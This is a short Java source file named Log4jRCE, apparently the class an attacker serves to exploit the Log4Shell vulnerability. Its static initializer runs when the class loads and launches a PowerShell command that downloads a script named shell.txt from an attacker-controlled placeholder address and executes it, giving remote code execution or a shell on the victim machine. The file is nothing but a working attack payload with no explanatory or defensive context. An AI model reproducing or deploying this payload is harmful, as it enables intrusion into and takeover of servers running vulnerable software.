public class Log4jRCE {
    static {
        try {
            Runtime.getRuntime().exec("powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://<ip>:<port>/shell.txt');iex 'powershell -E $code'").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
